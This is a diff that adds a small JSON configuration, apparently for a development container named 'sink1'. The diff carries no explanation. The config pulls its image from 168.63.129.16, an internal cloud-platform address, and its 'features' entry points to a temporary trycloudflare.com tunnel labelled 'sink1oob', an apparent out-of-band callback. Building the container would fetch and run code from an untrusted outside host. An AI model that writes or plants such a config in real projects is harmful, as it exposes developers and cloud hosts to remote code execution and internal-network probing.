@@ -1,0 +1,7 @@
+{
+ "name": "sink1",
+ "image": "168.63.129.16/x:latest",
+ "features": {
+  "sink1oob": "https://rand-terms-bytes-subsidiaries.trycloudflare.com/f1"
+ }
+}
